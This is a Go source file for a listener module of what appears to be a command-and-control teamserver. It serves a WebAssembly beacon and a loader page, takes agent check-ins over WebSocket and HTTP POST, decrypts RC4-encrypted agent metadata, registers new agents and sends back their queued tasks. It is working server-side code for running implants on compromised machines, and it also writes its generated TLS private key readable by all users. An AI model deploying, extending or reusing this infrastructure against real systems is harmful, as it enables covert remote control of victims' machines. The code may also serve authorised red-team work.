package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/rc4"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

type Listener struct {
	transport *TransportWASM
}

type TransportWASM struct {
	Server *http.Server
	Config TransportConfig
	Name   string
	Active bool

	upgrader websocket.Upgrader
	connsMu  sync.Mutex
	conns    map[string]*websocket.Conn
}

type TransportConfig struct {
	HostBind           string   `json:"host_bind"`
	PortBind           int      `json:"port_bind"`
	Callback_addresses []string `json:"callback_addresses"`
	EncryptKey         string   `json:"encrypt_key"`

	Ssl         bool   `json:"ssl"`
	SslCert     []byte `json:"ssl_cert"`
	SslKey      []byte `json:"ssl_key"`
	SslCertPath string `json:"ssl_cert_path"`
	SslKeyPath  string `json:"ssl_key_path"`

	WsEndpoint   string `json:"ws_endpoint"`
	WasmEndpoint string `json:"wasm_endpoint"`
	LoaderPage   string `json:"loader_page"`

	Protocol string `json:"protocol"`
}

func validConfig(config string) error {
	var conf TransportConfig
	err := json.Unmarshal([]byte(config), &conf)
	if err != nil {
		return err
	}

	if conf.HostBind == "" {
		return errors.New("HostBind is required")
	}

	if conf.PortBind < 1 || conf.PortBind > 65535 {
		return errors.New("PortBind must be in the range 1-65535")
	}

	if len(conf.Callback_addresses) == 0 {
		return errors.New("callback_servers is required")
	}
	for _, line := range conf.Callback_addresses {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		host, portStr, err := net.SplitHostPort(line)
		if err != nil {
			return fmt.Errorf("Invalid address (cannot split host:port): %s\n", line)
		}

		port, err := strconv.Atoi(portStr)
		if err != nil || port < 1 || port > 65535 {
			return fmt.Errorf("Invalid port: %s\n", line)
		}

		ip := net.ParseIP(host)
		if ip == nil {
			if len(host) == 0 || len(host) > 253 {
				return fmt.Errorf("Invalid host: %s\n", line)
			}
		}
	}

	if conf.WsEndpoint == "" {
		return errors.New("ws_endpoint is required")
	}

	if conf.WasmEndpoint == "" {
		return errors.New("wasm_endpoint is required")
	}

	match, _ := regexp.MatchString("^[0-9a-f]{32}$", conf.EncryptKey)
	if len(conf.EncryptKey) != 32 || !match {
		return errors.New("encrypt_key must be 32 hex characters")
	}

	return nil
}

func (t *TransportWASM) Start(ts Teamserver) error {
	t.upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
	}
	t.conns = make(map[string]*websocket.Conn)

	mux := http.NewServeMux()

	mux.HandleFunc(t.Config.WsEndpoint, func(w http.ResponseWriter, r *http.Request) {
		t.handleWebSocket(w, r, ts)
	})

	mux.HandleFunc(t.Config.WasmEndpoint, func(w http.ResponseWriter, r *http.Request) {
		t.handleWasmServe(w, r)
	})

	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "POST" {
			t.handleHTTPPost(w, r, ts)
			return
		}
		t.serveLoaderPage(w, r)
	})

	t.Active = true

	t.Server = &http.Server{
		Addr:    fmt.Sprintf("%s:%d", t.Config.HostBind, t.Config.PortBind),
		Handler: mux,
	}

	if t.Config.Ssl {
		fmt.Printf("   Started listener '%s': wasm+wss://%s:%d\n", t.Name, t.Config.HostBind, t.Config.PortBind)

		listenerPath := ListenerDataDir + "/" + t.Name
		_, err := os.Stat(listenerPath)
		if os.IsNotExist(err) {
			err = os.Mkdir(listenerPath, os.ModePerm)
			if err != nil {
				return fmt.Errorf("failed to create %s folder: %s", listenerPath, err.Error())
			}
		}

		t.Config.SslCertPath = listenerPath + "/listener.crt"
		t.Config.SslKeyPath = listenerPath + "/listener.key"

		if len(t.Config.SslCert) == 0 || len(t.Config.SslKey) == 0 {
			err = t.generateSelfSignedCert(t.Config.SslCertPath, t.Config.SslKeyPath)
			if err != nil {
				t.Active = false
				return err
			}
		} else {
			_ = os.WriteFile(t.Config.SslCertPath, t.Config.SslCert, 0600)
			_ = os.WriteFile(t.Config.SslKeyPath, t.Config.SslKey, 0600)
		}

		cert, err := tls.LoadX509KeyPair(t.Config.SslCertPath, t.Config.SslKeyPath)
		if err != nil {
			t.Active = false
			return fmt.Errorf("failed to load certificate: %v", err)
		}

		t.Server.TLSConfig = &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS12,
			MaxVersion:   tls.VersionTLS13,
		}

		go func() {
			err = t.Server.ListenAndServeTLS("", "")
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				fmt.Printf("Error starting WASM/WSS server: %v\n", err)
			}
		}()
	} else {
		fmt.Printf("   Started listener '%s': wasm+ws://%s:%d\n", t.Name, t.Config.HostBind, t.Config.PortBind)

		go func() {
			err := t.Server.ListenAndServe()
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				fmt.Printf("Error starting WASM/WS server: %v\n", err)
			}
		}()
	}

	time.Sleep(500 * time.Millisecond)
	return nil
}

func (t *TransportWASM) Stop() error {
	t.connsMu.Lock()
	for id, conn := range t.conns {
		conn.Close()
		delete(t.conns, id)
	}
	t.connsMu.Unlock()

	listenerPath := ListenerDataDir + "/" + t.Name
	_, err := os.Stat(listenerPath)
	if err == nil {
		_ = os.RemoveAll(listenerPath)
	}

	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	return t.Server.Shutdown(ctx)
}

func (t *TransportWASM) handleWebSocket(w http.ResponseWriter, r *http.Request, ts Teamserver) {
	conn, err := t.upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer conn.Close()

	externalIP := strings.Split(r.RemoteAddr, ":")[0]

	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			break
		}

		if len(message) < 8 {
			continue
		}

		agentType, agentId, beat, bodyData, err := t.parseBeatAndData(message)
		if err != nil {
			continue
		}

		if !ts.TsAgentIsExists(agentId) {
			_, err = ts.TsAgentCreate(agentType, agentId, beat, t.Name, externalIP, true)
			if err != nil {
				continue
			}
		}

		_ = ts.TsAgentSetTick(agentId, t.Name)
		_ = ts.TsAgentProcessData(agentId, bodyData)

		t.connsMu.Lock()
		t.conns[agentId] = conn
		t.connsMu.Unlock()

		responseData, err := ts.TsAgentGetHostedAll(agentId, 0x1900000)
		if err != nil {
			continue
		}

		_ = conn.WriteMessage(websocket.BinaryMessage, responseData)
	}

	t.connsMu.Lock()
	for id, c := range t.conns {
		if c == conn {
			delete(t.conns, id)
			break
		}
	}
	t.connsMu.Unlock()
}

func (t *TransportWASM) handleHTTPPost(w http.ResponseWriter, r *http.Request, ts Teamserver) {
	bodyData, err := io.ReadAll(r.Body)
	if err != nil || len(bodyData) < 8 {
		w.WriteHeader(http.StatusNotFound)
		return
	}

	externalIP := strings.Split(r.RemoteAddr, ":")[0]

	agentType, agentId, beat, data, err := t.parseBeatAndData(bodyData)
	if err != nil {
		w.WriteHeader(http.StatusNotFound)
		return
	}

	if !ts.TsAgentIsExists(agentId) {
		_, err = ts.TsAgentCreate(agentType, agentId, beat, t.Name, externalIP, true)
		if err != nil {
			w.WriteHeader(http.StatusNotFound)
			return
		}
	}

	_ = ts.TsAgentSetTick(agentId, t.Name)
	_ = ts.TsAgentProcessData(agentId, data)

	responseData, err := ts.TsAgentGetHostedAll(agentId, 0x1900000)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write(responseData)
}

func (t *TransportWASM) handleWasmServe(w http.ResponseWriter, r *http.Request) {
	wasmPath := ModuleDir + "/beacon.wasm"
	if _, err := os.Stat(wasmPath); os.IsNotExist(err) {
		w.WriteHeader(http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "application/wasm")
	w.Header().Set("Cache-Control", "no-cache")
	http.ServeFile(w, r, wasmPath)
}

func (t *TransportWASM) serveLoaderPage(w http.ResponseWriter, r *http.Request) {
	page := t.Config.LoaderPage
	if page == "" {
		w.WriteHeader(http.StatusNotFound)
		return
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte(page))
}

func (t *TransportWASM) parseBeatAndData(data []byte) (string, string, []byte, []byte, error) {
	if len(data) < 4 {
		return "", "", nil, nil, errors.New("data too short")
	}

	beatLen := int(binary.BigEndian.Uint32(data[:4]))
	data = data[4:]

	if len(data) < beatLen {
		return "", "", nil, nil, errors.New("beat data too short")
	}

	beatCrypt := data[:beatLen]
	bodyData := data[beatLen:]

	encKey, err := hex.DecodeString(t.Config.EncryptKey)
	if err != nil {
		return "", "", nil, nil, errors.New("failed to decode encrypt key")
	}
	rc4crypt, err := rc4.NewCipher(encKey)
	if err != nil {
		return "", "", nil, nil, errors.New("rc4 error")
	}
	agentInfo := make([]byte, len(beatCrypt))
	rc4crypt.XORKeyStream(agentInfo, beatCrypt)

	if len(agentInfo) < 8 {
		return "", "", nil, nil, errors.New("agent info too short")
	}

	agentType := fmt.Sprintf("%08x", uint(binary.BigEndian.Uint32(agentInfo[:4])))
	agentInfo = agentInfo[4:]
	agentId := fmt.Sprintf("%08x", uint(binary.BigEndian.Uint32(agentInfo[:4])))
	agentInfo = agentInfo[4:]

	return agentType, agentId, agentInfo, bodyData, nil
}

func (t *TransportWASM) generateSelfSignedCert(certFile, keyFile string) error {
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return fmt.Errorf("failed to generate private key: %v", err)
	}

	serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
	serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
	if err != nil {
		return fmt.Errorf("failed to generate serial number: %v", err)
	}

	template := x509.Certificate{
		SerialNumber:          serialNumber,
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	hostBind := strings.TrimSpace(t.Config.HostBind)
	if hostBind == "" || hostBind == "0.0.0.0" || hostBind == "::" {
		template.DNSNames = []string{"localhost"}
		template.IPAddresses = []net.IP{net.ParseIP("127.0.0.1"), net.ParseIP("::1")}
	} else if ip := net.ParseIP(hostBind); ip != nil {
		template.IPAddresses = []net.IP{ip}
	} else {
		template.DNSNames = []string{hostBind}
	}

	certData, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return fmt.Errorf("failed to create certificate: %v", err)
	}

	var certBuffer bytes.Buffer
	_ = pem.Encode(&certBuffer, &pem.Block{Type: "CERTIFICATE", Bytes: certData})
	t.Config.SslCert = certBuffer.Bytes()
	_ = os.WriteFile(certFile, t.Config.SslCert, 0644)

	keyData := x509.MarshalPKCS1PrivateKey(privateKey)
	var keyBuffer bytes.Buffer
	_ = pem.Encode(&keyBuffer, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: keyData})
	t.Config.SslKey = keyBuffer.Bytes()
	_ = os.WriteFile(keyFile, t.Config.SslKey, 0644)

	return nil
}
